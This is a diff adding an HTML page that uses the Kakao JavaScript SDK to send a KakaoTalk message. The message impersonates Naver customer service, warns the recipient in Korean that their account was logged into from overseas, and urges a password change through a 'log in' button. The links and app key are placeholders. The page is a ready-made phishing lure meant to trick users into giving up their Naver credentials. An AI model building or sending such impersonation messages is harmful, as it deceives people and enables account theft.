@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <a id="kakao-link-btn" href="javascript:sendLink()">
+        <img src="https://developers.kakao.com/assets/img/about/logos/kakaolink/kakaolink_btn_medium.png" />
+    </a>
+    <script src="https://developers.kakao.com/sdk/js/kakao.min.js"></script>
+    <script>Kakao.init('YOUR APP KEY!!!!!!!!!');</script>
+    <script type="text/javascript">
+        function sendLink() {
+            Kakao.Link.sendDefault({
+                objectType: 'feed',
+                content: {
+                    title: '네이버 고객센터',
+                    description: '고객님의 네이버 계정이 해외에서 로그인 되었습니다. 비밀번호를 바꾸는 것을 권장드립니다.',
+                    imageUrl:
+                        'https://korcan50years.files.wordpress.com/2016/06/naver.jpg',
+                    link: {
+                        mobileWebUrl: 'https://developers.kakao.com',
+                        webUrl: 'https://developers.kakao.com',
+                    },
+                },
+                buttons: [
+                    {
+                        title: '로그인 하기',
+                        link: {
+                            mobileWebUrl: 'https://developers.kakao.com',
+                            webUrl: 'https://developers.kakao.com',
+                        },
+                    },
+                ],
+            })
+        }
+    </script>
+</body>
+
+</html>
